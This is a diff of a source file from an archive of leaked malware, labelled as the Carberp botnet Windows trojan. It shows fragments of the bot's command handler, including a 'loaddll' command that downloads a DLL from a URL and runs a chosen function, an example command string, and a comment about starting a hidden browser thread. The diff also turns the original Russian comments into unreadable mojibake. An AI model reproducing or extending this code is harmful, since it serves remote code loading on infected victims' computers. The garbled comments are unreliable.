@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include"ComandLoadDLL.h"
 #include"Plugins.h"
 
@@ -135,7 +146,7 @@ typedef struct
 } VoidData, * PVoidData;
 
 typedef LPVOID PParams;
-//возвращаемые значения
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //0 - error
 //1 -(i-) integer
 //2 -(c-) char
@@ -283,12 +294,12 @@ DWORD WINAPI RunLoaderThread( LPVOID lpData )
 	return 0;
 
 }
-//loaddll url funcname parametrs до 4х штук
+//loaddll url funcname parametrs пїЅпїЅ 4пїЅ пїЅпїЅпїЅпїЅ
 //loaddll "decl:WINAPIV|dll.plug|StartHTTP|c-http://site.com'|i-2|"
-// первый парамент не обязателен, как и параметры функции i- интеджер c- 
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ i- пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ c- 
 bool ExecuteAllCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 {
-	// Запуск потока скрытого браузера
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Argums=Args;
 	PVoidData V = CreateStruct(VoidData);
 	if (Args[0]=='d'&&Args[1]=='e'&&Args[2]=='c'&&Args[3]=='l'&&Args[4]==':')
